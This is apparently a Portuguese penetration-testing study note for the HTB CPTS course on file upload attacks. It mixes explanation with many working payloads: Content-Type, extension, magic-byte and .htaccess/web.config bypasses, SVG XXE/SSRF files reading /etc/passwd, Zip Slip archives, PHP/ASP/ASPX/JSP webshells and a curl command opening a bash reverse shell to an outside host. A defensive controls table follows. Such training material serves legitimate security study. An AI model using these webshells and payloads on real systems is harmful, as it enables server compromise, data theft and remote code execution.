---
tema: Web / Exploração
tópico: File Upload Attacks — bypass de validação e upload para RCE
tags: [htb, cpts, upload, rce, webshell, bypass, web]
dificuldade: medium
---

# 📤 CPTS 21 — File Upload Attacks

> [!info] Objetivo
> Transformar um formulário de upload em **execução de código**. A falha raramente é "o app aceita arquivos": é a **validação incompleta** — só no cliente, só no `Content-Type`, blacklist fraca ou diretório de upload servido com interpretador.
> Meta prática: subir um arquivo que o servidor **executa**, ou que outro componente (parser XML, descompactador, renderizador de imagem) processa de forma perigosa.

---

## 🎯 Quando usar

| Sinal | Por que importa |
|-------|-----------------|
| Formulário com `<input type="file">` | Superfície clássica; quase sempre há validação burlável |
| Upload de avatar / anexo / importação de CSV+ZIP | Muitas vezes o arquivo é **armazenado e reprocessado** depois |
| API `multipart/form-data` em `/api/v1/upload` | Validação costuma ficar no front; backend confia |
| Perfil do usuário com "foto" renderizada como SVG | Vetor de **XXE / SSRF** server-side |
| Framework com pasta `uploads/` acessível | Se o diretório tem PHP habilitado, upload = RCE |
| CMS/plugin que permite "upload de tema/plugin" | Já é execução de código por design, com auth |

> [!tip] Pergunta-guia
> *Onde o arquivo vai parar* e *quem interpreta esse diretório*? Validação burlada sem diretório executável não dá RCE — pode dar XSS armazenado, SSRF ou DoS de disco.

---

## 🧰 Ferramentas

| Ferramenta | Uso típico |
|-----------|-----------|
| **Burp Suite** | Interceptar o `multipart`, alterar `filename`/`Content-Type` sem tocar no front |
| **curl** | Reproduzir o POST multipart de forma controlada e scriptável |
| **ffuf / gobuster** | Descobrir onde o arquivo caiu (`/uploads/`, `/files/<id>`) |
| **exiftool** | Injetar payload em metadados / montar polyglot |
| **gifsicle / ImageMagick** | Gerar imagem válida com magic bytes corretos |
| **GNU `zip`** | Montar arquivos compactados para bypass e para Zip Slip |
| **cadaver / davtest** | Upload via WebDAV (PUT) quando o método está habilitado |
| **Wappalyzer / whatweb** | Descobrir linguagem e servidor → escolher a extensão certa |

---

## 🖥️ 1. Bypass de validação client-side

A validação em JavaScript só existe no navegador. Basta remover o handler ou reenviar a request.

```javascript
// No DevTools, antes de submeter: neutraliza a checagem de extensão
document.querySelector('form').onsubmit = null;
// ou desabilita o atributo de aceitação de tipos
document.querySelector('input[type=file]').removeAttribute('accept');
```

- **Burp**: altere `filename="shell.php"` e mantenha o resto.
- **curl**: reenvia sem passar pelo navegador — o JS nunca roda.

> [!warning] Client-side *não* é o obstáculo real
> Se o upload falha mesmo com Burp, a validação está no **servidor**. Aí começam os bypasses abaixo.

---

## 📄 2. Bypass de `Content-Type`

Servidor confia no MIME declarado no `multipart`.

```http
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg      <-- mente aqui; o conteúdo continua PHP

<?php system($_GET['cmd']); ?>
```

| `Content-Type` falso | Quando funciona |
|----------------------|-----------------|
| `image/jpeg`, `image/png`, `image/gif` | Validação só de MIME declarado |
| `application/octet-stream` | Uploads genéricos |
| `text/plain` | Áreas de anexo de texto |

---

## 🔎 3. Bypass de blacklist de extensão

Se `.php` é bloqueado, o servidor pode aceitar variantes que o mesmo interpretador executa.

| Extensão | Observação |
|----------|-----------|
| `.php`, `.php3`, `.php4`, `.php5`, `.php7` | Apache com `AddType` multi-extensão |
| `.phtml`, `.pht`, `.phar`, `.phps`, `.pgif` | Muito comum em labs e CMS antigos |
| `.inc` | PHP por vezes configurado para executar |
| `.module` | Drupal |
| `.asp`, `.aspx`, `.ashx`, `.asmx`, `.config` | Stack IIS / .NET |
| `.jsp`, `.jspx`, `.jspf` | Tomcat / Java |
| `.cgi`, `.pl`, `.py` | Servidores com CGI habilitado |

```bash
# Fuzz de extensão: troque a extensão aceita mantendo o nome do arquivo
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
     -u "http://<IP>/upload/shell.FUZZ" \
     -X POST -H "Cookie: <COOKIE>" \
     -F "file=@shell.txt;type=image/jpeg" -fs 0
```

```text
# Wordlist útil de extensões alternativas (monte você mesmo se faltar)
.php .php2 .php3 .php4 .php5 .php7 .pht .phtml .phar .phps .pgif .inc
```

> [!tip] Case sensitivity
> Teste `.pHp`, `.PHP`, `.PhP`: se o filtro compara string sem `tolower()` e o sistema de arquivos é case-insensitive (Windows) ou o handler ignora o caso, passa.

---

## 📁 4. `.htaccess` e `web.config`

Se você consegue subir `.htaccess`, pode **criar um handler novo** e depois subir o shell com extensão "estranha".

```apache
# .htaccess — faz o Apache executar .evil como PHP (mod_php)
AddType application/x-httpd-php .evil
```

```apache
# Alternativa por handler — útil quando AddType é filtrado
AddHandler application/x-httpd-php .evil
```

```xml
<!-- web.config — IIS: permite executar .evil via ISAPI -->
<configuration>
  <system.webServer>
    <handlers>
      <add name="evil" path="*.evil" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\System32\inetsrv\asp.dll"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

Fluxo: sobe `.htaccess` → sobe `shell.evil` → acessa `/uploads/shell.evil` → executa.

> [!warning] Depende de `AllowOverride All`
> Se o Apache tem `AllowOverride None`, `.htaccess` é ignorado. Verifique primeiro se o `.htaccess` é servido como arquivo (ex.: `/uploads/.htaccess` retorna 403/200) para saber que existe.

---

## 🧬 5. Magic bytes e validação de conteúdo

Servidores que inspecionam o início do arquivo comparam com assinaturas conhecidas.

| Formato | Bytes iniciais |
|---------|----------------|
| GIF | `GIF87a` / `GIF89a` |
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| PDF | `%PDF` |
| ZIP | `PK\x03\x04` |

```php
# GIF + PHP: os 6 primeiros bytes são assinatura GIF válida, o resto é código
GIF89a
<?php system($_GET['cmd']); ?>
```

```bash
# Embutir PHP em metadados EXIF de uma imagem real
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legítima.jpg \
         -o shell.php.jpg
# Depois: se o arquivo for interpretado por upload mal feito, a extensão final decide
```

```bash
# Gerar PNG válido com payload no final (concatenação de bytes)
printf '\x89PNG\r\n\x1a\n' > shell.png
cat php_payload.txt >> shell.png
```

> [!tip] `X-Content-Type-Options: nosniff`
> Só afeta o **navegador**, não o interpretador server-side. Serve para XSS polyglot, não impede RCE.

---

## ⛓️ 6. Dupla extensão, path traversal e null byte

### Dupla extensão
Depende de como o backend compõe caminho/interpretador.

```text
shell.php.jpg   -> Apache mal configurado executa a primeira extensão? (raro, mas testável)
shell.jpg.php   -> o shell fica na última extensão (funciona se só o final é validado)
shell.php%00.jpg -> null byte
```

### Path traversal no `filename`
Campo `filename` pode conter `../` e escrever fora da pasta de upload.

```bash
# Escrita em /var/www/html/ a partir de uma pasta /uploads com permissão
curl -F 'file=@shell.php;filename=../../shell.php' http://<IP>/upload
```

### Null byte (legado)
```text
shell.php%00.jpg
```
Só faz sentido em stacks antigas (PHP < 5.3.4) onde a string foi truncada no `\0`. Em código moderno isso é rejeitado. **Teste, não assuma.**

---

## 🖼️ 7. SVG, XXE e SSRF em upload

SVG é XML. Se o servidor **renderiza** o SVG (thumbnail, ImageMagick, librsvg), entidades externas são processadas.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="300">
  <text x="10" y="40" font-size="16">&xxe;</text>
</svg>
```

```xml
<!-- SVG como SSRF: o renderizador busca o recurso interno -->
<!DOCTYPE svg [ <!ENTITY ssrf SYSTEM "http://127.0.0.1:8080/admin"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&ssrf;</text></svg>
```

- Conteúdo de arquivos **multilinha** (como `/etc/passwd`) costuma quebrar o XML; exfiltre via OOB ou leia arquivos de linha única (`/etc/hostname`).
- DOCX/XLSX também são ZIP+XML: mesmo vetor quando o server abre o arquivo.

> [!info] Cadeia de ataque
> Upload de SVG → parser XXE → leitura de arquivo/SSRF. O "upload" aqui é só o **transporte**; a falha é XXE.

---

## 🗜️ 8. Arquivos compactados e Zip Slip

Quando a app **descompacta** o arquivo enviado, o vetor muda.

```bash
# Payload com path traversal dentro do ZIP (Zip Slip)
ln -s /var/www/html/shell.php link
zip --symlinks evil.zip link
# ou um entry cujo nome é ../../../../var/www/html/shell.php
```

- Extração para diretório servido → grava o shell direto no webroot.
- Cuidado com names contendo `../`, symlinks e nomes absolutos.
- Alguns frameworks extraem **dentro** do webroot por design; aí o zip vira RCE trivial.

---

## 🧩 9. Polyglot e bypass de WAF

Arquivo que é **válido em dois formatos** ao mesmo tempo.

```php
# GIF+PHP: abre como imagem E executa como PHP
GIF89a<?php /* code */ system($_GET['cmd']); ?>
```

```bash
# JPEG+PHP usando comentário no EXIF
exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg -o poly.jpg.php
```

- Bypass de WAF que assina `<?php`: use tags curtas (`<?=`), `<? echo`, ou encoding no corpo.
- `Content-Type` e magic bytes podem ser combinados: WAF olha um, o interpretador olha outro.

---

## 🐚 10. Webshells e upload → RCE

### Web shells mínimos
```php
# PHP
<?php system($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['c']); ?>
```

```asp
<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll) %>
```

```aspx
<%@ Page Language="C#" %>
<% var p = new System.Diagnostics.Process();
   p.StartInfo.FileName = "cmd.exe";
   p.StartInfo.Arguments = "/c " + Request["cmd"];
   p.StartInfo.RedirectStandardOutput = true;
   p.StartInfo.UseShellExecute = false;
   p.Start();
   Response.Write(p.StandardOutput.ReadToEnd()); %>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### Cadeia completa
1. **Descobrir** o formulário/endpoint e as validações (probe com `.txt` inofensivo).
2. **Burlar** validações em camadas (client → MIME → extensão → conteúdo).
3. **Verificar** onde o arquivo foi gravado (resposta com URL, ou fuzz em `/uploads/`).
4. **Confirmar execução** com comando inofensivo → depois reverse shell.

```bash
# Confirma RCE sem barulho
curl "http://<IP>/uploads/shell.php?cmd=id"
curl "http://<IP>/uploads/shell.php?cmd=hostname"
```

```bash
# Do webshell para shell interativo
curl "http://<IP>/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<IP>/<PORT>%200>%261'"
```

> [!tip] Upload como assistente de LFI
> Se já existe LFI e o diretório de upload é previsível, não precisa executar direto: `?page=/uploads/avatar.jpg` com PHP embutido passa pelo `include` e roda.

---

## 🛡️ 11. Defesas (lado azul)

| Controle | Efeito |
|----------|--------|
| Whitelist de extensão **+** verificação de conteúdo real | Fecha variantes e magic bytes |
| Renomear arquivo no servidor (UUID) e não usar nome do usuário | Mata path traversal e execução por extensão |
| Armazenar **fora** do webroot e servir por handler | O arquivo nunca é interpretado |
| `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` | Reduz XSS via upload |
| Desabilitar execução no diretório de upload (`php_admin_flag engine off`) | Upload não vira RCE |
| Rejeitar `.htaccess`/`web.config`/`.user.ini` | Impede criar handlers |
| Validar limites de tamanho e descompactar com checagem de path | Fecha DoS e Zip Slip |
| Antivirus/YARA no arquivo processado | Detecta webshells conhecidos |

---

## ⚠️ Pegadinhas

- **`uploads/` sem interpretador**: subir PHP não executa. Sem RCE ali — procure LFI, XSS armazenado ou SSRF.
- **Extensão não é tudo**: confirme com `Content-Type` e magic bytes juntos; validação costuma ser em **camadas**.
- **Nome do arquivo é sobrescrito**: se o servidor renomeia para UUID, path traversal e escolha de extensão morrem. Repense o vetor.
- **Cache/CDN**: o proxy pode servir a versão antiga do arquivo; force reload com `?v=1`.
- **Null byte é legado**: se a stack é moderna, `%00` retorna erro e não é bypass.
- **`.htaccess` bloqueado mas presente**: se ele é servido (200), foi gravado — verifique antes de concluir que falhou.
- **SVG nem sempre é renderizado server-side**: se é só `<img src>`, XXE não acontece; XSS sim.
- **Não confunda 500 com bloqueio**: erro do interpretador (ex.: sintaxe PHP) indica que o arquivo **chegou** e foi executado.

---

## ✅ Checklist rápido

```text
[ ] Identificar TODOS os pontos de upload (web, API, perfil, importação)
[ ] Enviar arquivo inofensivo e observar resposta/URL de destino
[ ] Testar bypass client-side via Burp/curl
[ ] Testar Content-Type falso (image/*)
[ ] Testar variantes de extensão (php3, phtml, pht, phar, pgif, case)
[ ] Testar dupla extensão (.jpg.php, .php.jpg)
[ ] Testar path traversal no filename
[ ] Testar magic bytes (GIF89a, PNG, JPEG)
[ ] Testar .htaccess / web.config
[ ] Testar SVG (XXE / SSRF) se houver render server-side
[ ] Descobrir o diretório de gravação (ffuf/gobuster)
[ ] Confirmar execução com comando inofensivo
[ ] Escalar: reverse shell estável / LFI
[ ] Documentar payload exato e o que cada camada de validação exigiu
```

---

## 🔗 Relacionado

- [[CPTS 20 - File Inclusion]]
- [[CPTS 22 - Command Injections]]
- [[CPTS 14 - Using Web Proxies]]
- [[CPTS 24 - Attacking Common Applications]]
- [[Fase 06 - Vulnerabilidade e Exploração]]
